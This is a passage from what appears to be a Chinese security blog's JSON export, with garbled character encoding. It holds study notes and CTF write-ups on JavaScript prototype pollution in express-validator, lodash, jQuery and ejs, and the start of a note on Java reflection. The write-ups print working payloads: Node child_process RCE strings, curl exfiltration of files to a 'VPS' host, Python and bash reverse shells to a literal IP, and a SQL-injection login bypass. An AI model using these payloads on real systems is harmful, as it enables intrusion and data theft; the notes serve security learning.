å…¥Object.assignï¼Œå°†sanitizerså’Œvalidatorsæµ…æ‹·è´åˆ°middlewareä¸Šï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªmiddlewareè°ƒç”¨æ‰€æœ‰çš„éªŒè¯å’Œè¿‡æ»¤å‡½æ•°\nä¹‹åè¿›å…¥express-validator\\src\\chain\\context-runner-impl.jsçœ‹åˆ°trim()ï¼Œè·Ÿå…¥è°ƒç”¨\nexpress-validator\\src\\context-builder.js\nèŠœï¼Œç«Ÿç„¶æ˜¯ä¸€ä¸ªå…¥æ ˆæ“ä½œï¼ŒæŠŠä¼ å…¥çš„å€¼å‹å…¥æ ˆä¸­\nå›è¿‡å¤´å»çœ‹this.builder.addItemï¼Œä¼ å…¥çš„æ˜¯ä»¥trimä¸ºå‚æ•°çš„Sanitizationå¯¹è±¡ï¼Œä¸ºbuilderå¢åŠ ä¸€ä¸ªsanitizationåè¿”å›this.chainå³middlewareï¼Œåšåˆ°é“¾å¼è°ƒç”¨\nè·Ÿå…¥è¿™ä¸ªSanitization\nrunæ–¹æ³•ä¸­è°ƒç”¨context.setDataæ¥è°ƒç”¨ä¼ å…¥çš„sanitizerä¿®æ”¹æ–°çš„å€¼\nå†å¾€å‰ï¼Œå›åˆ°node_modules\\express-validator\\src\\middlewares\\check.jsï¼Œåˆšæ‰æˆ‘ä»¬åªçœ‹äº†è¿”å›å€¼ï¼Œä½†å®ƒä¼šå…ˆåœ¨ç¬¬12è¡Œnewä¸€ä¸ªContextRunnerImpl\nnode_modules\\express-validator\\src\\chain\\context-runner-impl.js\nå®ƒçš„runæ–¹æ³•åœ¨ä¹‹å‰çš„ç¬¬15è¡Œè¢«è°ƒç”¨ï¼Œå¯ä»¥çœ‹ä½œæ˜¯middlewareè°ƒç”¨çš„å…¥å£ï¼Œè¿™ä¸ªrunå…ˆç”³è¯·äº†ä¸€ä¸ªcontextï¼ˆå¯ä»¥ç†è§£ä¸ºhttpè¯·æ±‚çš„ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå°è£…ï¼‰ï¼Œ27è¡Œæœ‰ä¸€ä¸ªforéå†ï¼Œå¯¹äºæ ˆä¸­çš„itemï¼ˆè¿™ä¸ªæ ˆå°±æ˜¯ä¹‹å‰addItemçš„æ ˆï¼‰å†ä¾æ¬¡è°ƒç”¨å®ƒçš„runæ–¹æ³•\nç©¶æå¥—å¨ƒï¼Œæ€»ç»“æ•´ä¸ªé€»è¾‘å°±æ˜¯è¿™æ ·çš„ï¼š\né¦–å…ˆå°†validatorå’Œsanitizersçš„æ–¹æ³•ç»‘å®šåˆ°checkå‡½æ•°è¿”å›çš„middlewareä¸Šï¼Œè¿™äº›validatorå’Œsanitizerçš„æ–¹æ³•æ˜¯é€šè¿‡å‘context.stackä¸­push context-itemsï¼Œæœ€ååœ¨ContextRunnerImpl.runæ–¹æ³•é‡Œéå†æ ˆä¸­çš„itemsï¼Œé€ä¸€è°ƒç”¨å…¶runæ–¹æ³•å®ç°validationæˆ–sanitization\nç»“åˆlodash.setæ‰©å¤§æ”»å‡»é¢ åœ¨ä¸Šé¢åˆ†æçš„æœ€åéƒ¨åˆ†æˆ‘ä»¬æåˆ°äº†å®é™…è°ƒç”¨æ—¶çš„forå¾ªç¯\n45è¡Œæœ‰ä¸ªifï¼Œå¦‚æœæ»¡è¶³options.dryRunä¸ºç©ºä¸”reqValue!==instance.valueï¼Œå°±å¯ä»¥è°ƒç”¨_.setæ¥é‡ç½®req[location]ä¸­çš„å€¼ä¸ºnewValueï¼›è€Œç¬¬ä¸€ä¸ªé»˜è®¤æ˜¯undefinedä¸ç”¨ç®¡ï¼Œè€Œç¬¬äºŒä¸ªï¼Œä»¥trimä¸ºä¾‹ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°ä¸¤è¾¹å­˜åœ¨ç©ºç™½å­—ç¬¦ï¼Œç»è¿‡trimå¤„ç†åå°±å¯ä»¥æ»¡è¶³è¿™ä¸ªæ¡ä»¶äº†\nè¿™ä¸ª_.setæ­£æ˜¯æˆ‘ä»¬çš„è€æœ‹å‹lodash.setï¼Œå°è¯•lodash.setçš„payload\n{\u0026#34;__proto__.[whoami]\u0026#34;: \u0026#34;amiz \u0026#34;} è™½ç„¶æ»¡è¶³äº†æ¡ä»¶ä½†å¹¶ä¸èƒ½æ±¡æŸ“æˆåŠŸï¼Œåœ¨å…³é”®å¤„æ‰“æ–­ç‚¹ï¼Œå®šä½åˆ°node_modules\\express-validator\\src\\select-fields.jsï¼ˆå› ä¸ºåœ¨ContextRunnerImpl.jsä¸­çš„24è¡Œï¼Œåœ¨è°ƒç”¨å„ç§å…·ä½“çš„runæ–¹æ³•ä¹‹å‰å…ˆè°ƒç”¨äº†this.selectFields\n35è¡Œæ˜¯ä¸€ä¸ª*çš„é€šé…ç¬¦ï¼Œ{\u0026quot;a\u0026quot;:{\u0026quot;b\u0026quot;:\u0026quot;123\u0026quot;}}è¿™æ ·çš„bodyå‚æ•°å°±ä¼šå¯¹bè¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯å¦‚æœæ˜¯{\u0026quot;a.b\u0026quot;:\u0026quot;123\u0026quot;}è¿™æ ·çš„ï¼Œä¼šå°†a.bè§†ä½œä¸€ä¸ªkeyï¼Œä¸ä¼šå¯¹a.bè¿›è¡ŒéªŒè¯ï¼Œåœ¨ä¼ å…¥expressæ—¶ä¸ä¼šè‡ªåŠ¨è¿›è¡Œunfalttenè€Œå˜ä¸ºä¸€ä¸ªaå¯¹è±¡åŒ…å«ä¸€ä¸ªbå¯¹è±¡ï¼›ä½†express-validatorå†…éƒ¨æ˜¯é€šè¿‡lodashçš„_getå’Œ_setå¯¹å¯¹è±¡è¿›è¡Œèµ‹å€¼å’Œå–å€¼ï¼Œå½“ä¼ å…¥a.bæ—¶lodashä¼šè‡ªåŠ¨è¿›è¡Œä¸€ä¸ªå¥—å¨ƒï¼ˆå…·ä½“çš„å‰é¢å·²ç»å†™äº†ï¼‰ï¼Œä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‡ºç°ï¼Œexpress-validatorå¯¹keyè¿›è¡Œæ£€æŸ¥ï¼Œå¯ä»¥çœ‹åˆ°57è¡Œï¼Œå‡ºç°.å°±ä¼šåœ¨å‘¨å›´åŠ ä¸€å¯¹æ–¹æ‹¬å·ï¼Œèµ·åˆ°è½¬ä¹‰ä½œç”¨\næ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„å°±ä¼šå˜æˆè¿™æ ·\nåœ¨ä¸¤ç«¯å¤šäº†æ–¹æ‹¬å·ï¼Œç ´åäº†æˆ‘ä»¬åŸæ¥çš„payloadï¼Œç›¸å½“äº\nvar _ = require(\u0026#39;lodash\u0026#39;) var a = {\u0026#34;__proto__.[whoami]\u0026#34;: \u0026#34;amiz\u0026#34;} _.set(a,\u0026#34;[\\\u0026#34;__proto__.[whoami]\\\u0026#34;]\u0026#34;, 2)\t// å¤šäº†æ–¹æ‹¬å· æˆ‘ä»¬è¦åˆ©ç”¨select-filedsçš„ä¸€äº›è½¬ä¹‰çš„æŠ€å·§æ¥bypass\n{\u0026#34;\\\u0026#34;].__proto__[\\\u0026#34;whoami\u0026#34;:\u0026#34;Vulnerable\u0026#34;} ç›¸å½“äº\nvar _ = require(\u0026#39;lodash\u0026#39;) var c = {\u0026#34;\\\u0026#34;].__proto__[\\\u0026#34;whoami\u0026#34;: \u0026#34;Vulnerable\u0026#34;} _.set(c,\u0026#34;[\\\u0026#34;\\\u0026#34;].__proto__[\\\u0026#34;whoami\\\u0026#34;]\u0026#34;, 2) æ„é€ payloadçš„æ—¶å€™è¿˜è¦æ³¨æ„lodash.setï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°pathçš„å€¼ç­‰äºç¬¬ä¸€ä¸ªå‚æ•°objectçš„é”®Keyæ—¶ä¼šæ±¡æŸ“å¤±è´¥\nå¯ä»¥æ±¡æŸ“åŸå‹é¡ºåˆ©å¢åŠ ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯å®ƒçš„å‚æ•°å´æ˜¯ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²ï¼ŒåŸå› æ˜¯_setæ—¶çš„ç¬¬ä¸‰ä¸ªå‚æ•°newValueæ—¶åˆ©ç”¨å˜åŒ–åçš„keyé‡æ–°ä»req[location]ä¸­å–å‡ºæ¥çš„ï¼ŒåŸæœ¬åº”è¯¥undefinedï¼Œä½†æ˜¯æˆ‘ä»¬ç»è¿‡Sanitizationçš„runæ–¹æ³•æ—¶æœ‰ä¸€ä¸ªtoString\næ‰€ä»¥undefinedå˜ä¸ºäº†ç©ºå­—ç¬¦ä¸²''\nç»è¿‡äº†è¿™ä¸€ç³»åˆ—çš„å¤„ç†ï¼ŒreqValueä¸ºç©ºå°±ä¼šç»è¿‡_.geté‡æ–°å–å€¼ï¼Œè€Œè¿™é‡Œå¾—åˆ°çš„undefinedä¸ä¼šè¢«toStringå¤„ç†ï¼Œåœ¨46è¡Œå¤„undefined!==''ä¾æ—§ä¸ºçœŸï¼Œç»§ç»­_.setï¼Œè¿›è¡ŒåŸå‹é“¾çš„æ±¡æŸ“\nè™½ç„¶åªèƒ½æœ‰é™çš„è¿›è¡Œæ±¡æŸ“ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç”±äºjsçš„ä¸€äº›ç‰¹æ€§ æ¯”å¦‚åœ¨åˆ¤æ–­ä¸­''è¿”å›falseï¼Œæˆ‘ä»¬å¯ä»¥æŠŠåŸæœ¬çš„åœ°æ–¹çš„åˆ¤æ–­æ¡ä»¶ç»“æœè¿›è¡Œä¸€äº›åè½¬ï¼Œä»è€Œç»•è¿‡æŸäº›é™åˆ¶æˆ–æ”¹å˜ä»£ç èµ°å‘ï¼ˆè·Ÿhitconçš„é‚£ä¸ªç¿»è½¬bitçš„æ€æƒ³æœ‰ç‚¹åƒäº†\njQueryçš„ä¹…è¿œrce - CVE-2015-9251 å½“jQueryçš„urlè¿”å›å¤´çš„content-typeå­—æ®µä¸ºtext/javascriptæ—¶ï¼Œå³ä½¿æ²¡æœ‰è®¾ç½®dataType: 'script'ä¹Ÿä¼šè‡ªåŠ¨evalè¿”å›å†…å®¹\nè¿™ä¸ªæ¼æ´åšåˆ°äº†XSS-\u0026gt;RCEçš„æ•ˆæœï¼Œä¸è¿‡å¾ˆæ—©å°±ä¿®å¤äº†ï¼ˆjQuery 3.0.0ï¼‰ï¼Œæ‰¾åˆ°ä¿®å¤çš„ä»£ç çœ‹èƒ½å¦ç»•è¿‡\né€šè¿‡s.crossDomainæ¥ä½œä¸ºifåˆ¤æ–­çš„æ¡ä»¶ï¼Œå¦‚æœä¸ºçœŸåˆ™ä¸ä¼šæ‰§è¡Œå†…å®¹\nè€Œè¿™ä¸ªs.CrossDomainåœ¨é»˜è®¤è®¾ç½®ä¸­ä¸å­˜åœ¨ï¼›ä¸è¿‡åœ¨jQueryåˆå§‹åŒ–æ—¶ç”¨åˆ°äº†jQuery.ajaxExtendè¿™ä¸ªå‡½æ•°ï¼Œå†…éƒ¨é€šè¿‡foréå†srcçš„key é“¾æ¥åœ¨è¿™é‡Œ\nä¼šå»æ‰¾å¯¹è±¡ä¸Šä¸å­˜åœ¨ä½†åŸå‹é“¾ä¸Šå­˜åœ¨çš„keyï¼Œå¦‚æœæ­¤æ—¶åŸå‹é“¾è¢«æ±¡æŸ“å°±ä¼šè¿å¸¦åˆ°targetï¼Œç¤ºä¾‹\nObject.prototype.polluted = \u0026#39;\u0026#39; let a = {} let c = {} for( key in c){ a[key] = c[key] } console.log(Object.keys(a)) // [ \u0026#39;polluted\u0026#39; ] console.log(a) // { polluted: \u0026#39;\u0026#39; } ç»è¿‡æ±¡æŸ“ä¹‹ås.crossDomain=''å˜ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåœ¨ç»è¿‡ä¸‹é¢è¿™ä¸ªåˆ¤æ–­\nåœ¨é»˜è®¤ä¸­çš„s.crossDomainæ˜¯undefinedï¼Œè€Œundefined==nullä¸ºtrueï¼Œæ‰€ä»¥åœ¨æ­£å¸¸æƒ…å†µä¸‹å¯ä»¥è¿›å…¥è¿™ä¸ªåˆ¤æ–­ï¼Œä¸è¿‡å‰é¢æˆ‘ä»¬æ±¡æŸ“å®ƒä¸º''ï¼Œäºæ˜¯è¿™é‡Œä¿ç•™ç©ºå­—ç¬¦ä¸²ä¸è¿›å…¥åˆ¤æ–­ï¼Œå¹¶ä¸”ä¸Šé¢çš„if(s.crossDomain)ä¹Ÿä¸ä¼šé€šè¿‡åˆ¤æ–­ï¼Œå¯¼è‡´s.content.script=trueï¼Œå°±å¯ä»¥rceäº†\n***å¼‚æ­¥ç¼–ç¨‹çš„é™·é˜± è¿™å—å…¶å®ä¸æ˜¯ç‰¹åˆ«æ‡‚\nç›´æ¥æ‹¿wpé‡Œçš„å›¾äº†ï¼‰è¿™é‡Œçš„requestsæ˜¯ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼Œåœ¨åˆ é™¤this.typesæ•°ç»„å¯¹åº”çš„é¡¹ä¹‹åï¼Œç”±äºå¼‚æ­¥å‡½æ•°çš„ç‰¹æ€§ï¼Œexpressä¸ä¼šç­‰å¾…requestsè€Œæ˜¯ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼Œæ‰€ä»¥this.datasä¸­å¯¹åº”é¡¹çš„åˆ é™¤ä¹Ÿä¼šè¢«å¯¹åº”çš„å¼‚æ­¥å»¶åï¼Œè¿™æ ·ä¸€æ¥åœ¨æŸä¸€æ—¶åˆ»ä¼šå­˜åœ¨è¿™æ ·çš„æƒ…å†µ\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼‚æ­¥å‡½æ•°å¯¼è‡´çš„æ•°æ®ä¸ä¸€è‡´å‘é€ä¸€äº›æ¶æ„è¯·æ±‚ï¼Œæ„é€ this.typeså’Œthis.datasä¸­é—´ä¸€ç«¯åƒè¿™ä¸ªæ ·å­\nç„¶åè®©é¢˜ç›®è®¿é—®æˆ‘ä»¬è‡ªå·±çš„urlï¼›ç”±äºåç«¯requestè¯·æ±‚çš„æ˜¯æœ¬åœ°ç¯å›é€Ÿåº¦å¾ˆå¿«ï¼Œæ‰€ä»¥ä¸ºäº†åœ¨dataRepo.Dä¸­requestæ²¡ç»“æŸæ—¶æ„é€ å¥½æˆ‘ä»¬æƒ³è¦çš„æ•°æ®å½¢å¼ï¼Œéœ€è¦dataRepo.Dä¸­requestsè€—æ—¶æ¯”æˆ‘ä»¬æ„é€ çš„æ—¶é—´ä¹…ï¼Œæ¯”å¦‚å…ˆpostä¸€äº›é“¾è¡¨å½¢å¼ä¸²èµ·æ¥çš„æ•°æ®ï¼Œæ¯”å¦‚\nç„¶åå†å‘èµ·é“¾è¡¨å¤´æ•°æ®çš„DELETEè¯·æ±‚ï¼Œè®©requestsè¿›è¡Œé€’å½’çš„åˆ é™¤ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡è¿™ä¸ªé“¾è¡¨çš„é•¿åº¦ä»è€Œæ§åˆ¶requestsèŠ±è´¹çš„æ—¶é—´ï¼Œè®©requestsè€—è´¹çš„æ—¶é—´ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸï¼›é“¾è¡¨çš„å®é™…é•¿åº¦éœ€è¦æ ¹æ®ä¸åŒçš„ç½‘ç»œçŠ¶å†µè¿›è¡Œè°ƒæ•´\nè·¨åŸŸé—®é¢˜ è®¾ç½®è¯·æ±‚å¤´æ—¶é™¤äº†æœ‰text/javascriptä»¥å¤–è¿˜è¦å¦å¤–è®¾ç½®å…è®¸è·¨åŸŸè®¿é—®çš„è¯·æ±‚å¤´\nres.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/javascript\u0026#34;) res.setHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34;) res.setHeader(\u0026#34;Access-Control-Allow-Headers\u0026#34;, \u0026#34;X-Requested-With, crossDomain\u0026#34;) è¯¦ç»†çš„exp\u0026amp;dockerè§å®˜æ–¹ä»“åº“\nå…³äºä»»æ„åŸå‹é“¾æ±¡æŸ“ ç”±äºå‡ºé¢˜äººåŠ äº†ä¸ªjsonçš„ä¸­é—´ä»¶å…è®¸ä¼ å…¥objectï¼Œå¯¼è‡´å¯ä»¥åšåˆ°ä»»æ„æ±¡æŸ“ï¼ˆè¿™ä¸‹æ ¼å±€æ‰“å¼€äº†ï¼‰\n{\u0026#34;block\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;a\u0026#34;: 123}}, \u0026#34;block\\\u0026#34;].__proto__[\\\u0026#34;a\u0026#34;: 123} [å®‰æ´µæ¯ 2020]Validator https://xz.aliyun.com/t/8581#toc-2\nif (req.body.password == \u0026#34;D0g3_Yes!!!\u0026#34;){ console.log(info.system_open) if (info.system_open == \u0026#34;yes\u0026#34;){ const flag = readFile(\u0026#34;/flag\u0026#34;) return res.status(200).send(flag) }else{ return res.status(400).send(\u0026#34;The login is successful, but the system is under test and not open...\u0026#34;) } }else{ return res.status(400).send(\u0026#34;Login Fail, Password Wrong!\u0026#34;) } åˆ©ç”¨ä¸Šé¢ä»»æ„åŸå‹é“¾æ±¡æŸ“çš„ç‚¹æ¥ä½¿info.system_openä¸ºçœŸ\n{\u0026#34;password\u0026#34;:\u0026#34;D0g3_Yes!!!\u0026#34;, \u0026#34;a\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34;}}, \u0026#34;a\\\u0026#34;].__proto__[\\\u0026#34;system_open\u0026#34;: \u0026#34;yes\u0026#34; } [å·…å³°æå®¢ 2021]ezjs https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5\nä¸è¿‡è¿™é‡Œä¸èƒ½ç›´æ¥ä¼ jsonï¼Œç”¨urlencode\nusername=amiz\u0026amp;password=amiz\u0026amp;\u0026#34;].__proto__[\u0026#34;isadmin=amiz\u0026amp;\u0026#34;].__proto__[\u0026#34;debug=amiz æ‰€ä»¥å°±ä¸éœ€è¦åæ–œæ ä»€ä¹ˆçš„å»è½¬ä¹‰jsonäº†\næ±¡æŸ“adminå’Œdebugä¹‹åæˆä¸ºç”¨adminçš„cookieæ‰“pugçš„getshellï¼Œæœ‰CVE-2021-21353\n/admin?p=\u0026#39;);process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).exec(\u0026#39;whoami\u0026#39;);_=(\u0026#39; curl -F \u0026#34;file=`ls -al /|base64`\u0026#34; http://VPS curl -F \u0026#34;file=`tac /root/flag.txt`\u0026#34; http://VPS curlå¤–å¸¦ï¼Œæˆ–è€…python shell\n/admin/?p=\u0026#39;);process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).exec(\u0026#39;python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#39;vps\\\u0026#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#39;/bin/bash\\\u0026#39;,\\\u0026#39;-i\\\u0026#39;]);\u0026#34;\u0026#39;);_=(\u0026#39; ejs(\u0026lt;=3.1.6) + lodash payload=\u0026#34;ee;return process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag \u0026amp;\u0026amp; echo successed\u0026#39;).toString();//\u0026#34; [XNUCA2019Qualifier]HardJS https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs\nå‰ç«¯å’Œåç«¯åˆ†åˆ«å­˜åœ¨åŸå‹æ±¡æŸ“çš„æ¼æ´ï¼Œå‰ç«¯çš„é—®é¢˜æ¥è‡ªäºejsçš„ç»å…¸outputFunctionNameï¼ˆæˆ–è€…escapeFunctionï¼‰\nåç«¯çš„é—®é¢˜æ¥è‡ªäºlodash.defaultsDeep\nçŸ¥é“æ¼æ´ç‚¹äº†ï¼Œæˆ‘ä»¬å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ\nå‰ç«¯çš„ejsç›´æ¥å¼¹shell\n{\u0026#34;type\u0026#34;:\u0026#34;test\u0026#34;,\u0026#34;content\u0026#34;:{\u0026#34;constructor\u0026#34;:{\u0026#34;prototype\u0026#34;: {\u0026#34;outputFunctionName\u0026#34;:\u0026#34;a=1;process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;bash -c \\\u0026#34;echo $FLAG\u0026gt;/dev/tcp/101.35.114.107/8426\\\u0026#34;\u0026#39;)//\u0026#34;}}}} {\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;client\u0026#34;: true,\u0026#34;escapeFunction\u0026#34;: \u0026#34;1; return process.env.FLAG\u0026#34;,\u0026#34;debug\u0026#34;:true, \u0026#34;compileDebug\u0026#34;: true}}} [MRCTF 2022]hurry up\nejs + js-extend [GKCTF 2021]easynode ä¸€çœ‹ä¾èµ–æ–‡ä»¶ï¼Œç»å…¸ejs 3.1.5è‚¯å®šæœ‰åŸå‹é“¾æ±¡æŸ“ï¼ŒåŒæ—¶éœ€è¦åˆ«çš„é…åˆï¼Œè¿™é‡Œçš„å­¤å„¿é€‰æ‰‹æ˜¯js-extend\né¦–å…ˆæ˜¯ç»•adminæƒé™çš„ç™»å½•ï¼Œåœ¨ç™»å½•å¤„å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œwafå¤„ç†\nç”¨äº†==å¼±æ¯”è¾ƒï¼Œå¹¶ä¸”safeStrç”¨äº†ç›¸åŠ ï¼Œä¸¤ä¸ªæ•°ç»„ç›¸åŠ ä¼šå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²\nusername[]=admin\u0026#39;#\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=a\u0026amp;username[]=(\u0026amp;password=123456 è¿™æ ·sqlè¯­å¥ä¼šå˜ä¸º\nselect * from test where username = \u0026#39;admin\u0026#39;#,1,1,1,1,1,1,1,1,1*\u0026#39; and password = \u0026#39;123456\u0026#39; ç›´æ¥æ³¨é‡Šæ‰passwordç™»å½•\nå¾—åˆ°adminçš„tokenä¹‹åå†åˆ°/addAdminå¤„æ·»åŠ ç”¨æˆ·ï¼ˆcookieçš„tokenå­—æ®µè®°å¾—ä¿®æ”¹ï¼‰\nusername=__proto__\u0026amp;password=123 /adminDIVå¤„post\ndata={\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzUuMTE0LjEwNy84NDI2IDA%2BJjEi|base64 -d|bash\u0026#39;);var __tmp2\u0026#34;} æ³¨æ„ä¸€å®šè¦b64+urlencodeï¼Œå†æ¬¡è®¿é—®/adminè§¦å‘rce\né˜²å¾¡ç­–ç•¥ å†»ç»“åŸå‹ Object.freeze(Object.prototype); Object.freeze(Object); ({}).__proto__.test = 123 ({}).test // this will be undefined ç™½åå•/é»‘åå• è¿­ä»£å¯¹è±¡å±æ€§ï¼Œè¿‡æ»¤__proto__å’Œprototypeï¼Œè¿˜æœ‰ä¸€äº›å…¶å®ƒçš„å±æ€§\nä½¿ç”¨mapç»“æ„ ç”¨mapæ•°æ®ç»“æ„æ¥ä»£æ›¿è‡ªå¸¦çš„å¯¹è±¡ç»“æ„\nä½¿ç”¨createè¿›è¡Œé˜²å¾¡ å°±å¾ˆnbï¼Œå®ƒåˆ›å»ºå¥½çš„å¯¹è±¡æ‰¾ä¸åˆ°åŸå‹é“¾\nvar obj = Object.create(null); obj.__proto__ // undefined obj.constructor // undefined ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»\nJavaScript_prototype_pollution_attack_in_NodeJS.pdf\nNodejs å¸¸è§æ¨¡å—åŸå‹é“¾æ±¡æŸ“ä¸å¸¸è§æ¨¡æ¿æ±¡æŸ“å‘ RCE\nå‰ç«¯åŸå‹é“¾æ±¡æŸ“æ¼æ´ç«Ÿå¯ä»¥æ‹¿ä¸‹æœåŠ¡å™¨shellï¼Ÿ\noooooooldjs writeup1 | wp2\nåœ¨JavaScriptä¸­å®ç°é“¾å¼è°ƒç”¨\n","date":"2022-05-04T17:10:23+08:00","permalink":"https://amiaaaz.github.io/2022/05/04/js-prototype-pollution-study-notes/","section":"posts","tags":["js"],"title":"jsåŸå‹æ±¡æŸ“å­¦ä¹ ç¬”è®°"},{"categories":["NOTES\u0026SUMMARY"],"contents":"pç‰›å®‰å…¨æ¼«è°ˆå­¦ä¹ \nåå°„ å…³äºåŠ¨æ€ç‰¹æ€§ï¼Œpç‰›ç»™å‡ºäº†è¿™æ ·çš„å®šä¹‰\nä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–\nPHPçš„ä¸€å¥è¯ğŸä¹Ÿæ­£æ˜¯è¿™ä¸ªç‰¹æ€§çš„ä½“ç°ä¹‹ä¸€ï¼Œjavaè™½ç„¶æ²¡æœ‰PHPè¿™ä¹ˆçµæ´»ï¼Œä½†æ˜¯å¼ºå¤§çš„åå°„åŠŸèƒ½ä¹Ÿå¯ä»¥æä¾›ä¸€äº›åŠ¨æ€ç‰¹æ€§ï¼Œæ¯”å¦‚è¿™æ ·çš„å‡½æ•°\npublic void execute(String className, String methodName) throws Exception{ Class cls = Class.forName(className); cls.getMethod(methodName).invoke(cls.newInstance());\t// æ‰§è¡Œ } æœ€ç»ˆæ‰§è¡Œçš„æ–¹æ³•æ ¹æ®ä¼ å…¥çš„å‚æ•°è€Œå®š\nforName è·å–ä¸€ä¸ªclassçš„Classå®ä¾‹çš„æ–¹å¼ä¹‹ä¸€æ˜¯Class.forNameï¼Œå®ƒæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½\nClass\u0026lt;?\u0026gt; forName(String name)\t// å¸¸ç”¨ Class\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader) ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œå®Œæ•´è·¯å¾„ï¼ˆå¦‚æœå¯æ§å°±å¯ä»¥åŠ è½½ä»»æ„ç±»ï¼‰ï¼Œå¦‚æœåŠ è½½å†…éƒ¨ç±»å¯ä»¥ç”¨Class.forName(\u0026quot;C1$C2\u0026quot;)\nç¬¬ä¸‰ä¸ªå‚æ•°ClassLoaderçš„ä½œç”¨æ˜¯å‘Šè¯‰JVMå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„ClassLoaderå°±æ˜¯æ ¹æ®ç±»åï¼ˆç±»å®Œæ•´è·¯å¾„ï¼‰æ¥åŠ è½½ç±»\nå¯¹äºç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ä½¿æˆ‘ä»¬è®¾ç½®trueï¼Œä¹Ÿä¸ä¼šåœ¨æ‰§è¡ŒforNameæ—¶æ‰§è¡Œæ„é€ å‡½æ•°ï¼Œå› ä¸ºè¿™é‡Œçš„initializeæŒ‡çš„æ˜¯ç±»çš„åˆå§‹åŒ–ï¼Œè°ƒç”¨å…¶ä¸­çš„staticéƒ¨åˆ†ä»£ç \nç±»çš„å®ä¾‹åŒ–(newInstance)ï¼šstatic{} -\u0026gt; {} -\u0026gt; æ„é€ å‡½æ•°\nç±»çš„åˆå§‹åŒ–(initial)ï¼šstatic{}\nç”±æ­¤ï¼Œå¦‚æœforNameçš„å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™æ¶æ„ç±»ï¼ˆæ¶æ„ä»£ç ä½äºstaticä¸­ï¼‰ï¼Œè¿›è€Œå®Œæˆå¯¹æŒ‡å®šç±»çš„åˆå§‹åŒ– è§¦å‘static{}éƒ¨åˆ†ï¼›ç¼–å†™poc\npackage ref; public class victim { public static void main(String[] args) throws Exception{ String name = \u0026#34;ref.exp\u0026#34;; Class.forName(name); } } package ref; public class exp { static { try{ Runtime rt = Runtime.getRuntime(); String[] cmd = {\u0026#34;calc.exe\u0026#34;}; Process ps = rt.exec(cmd); ps.waitFor(); }catch (Exception e){ System.out.println(\u0026#34;error here\u0026#34;); } } } getMethod\u0026amp;invoke Class.newInstanceè°ƒç”¨çš„æ˜¯è¯¥ç±»çš„publicæ— å‚æ„é€ å‡½æ•°ï¼Œè€Œæœ‰å‚æ•°çš„æ„é€ æ–¹æ³• æˆ–épublicçš„æ„é€ æ–¹æ³•éƒ½æ— æ³•é€šè¿‡Class.newInstance()è°ƒç”¨ï¼Œæ¯”å¦‚Runtimeçš„æ„é€ æ–¹æ³•å°±æ˜¯ç§æœ‰çš„ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰ï¼Œä¸‹é¢çš„æ —å­å°±æ— æ³•æ‰§è¡Œ\nClass cls = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); cls.getMethod(\u0026#34;exec\u0026#34;, 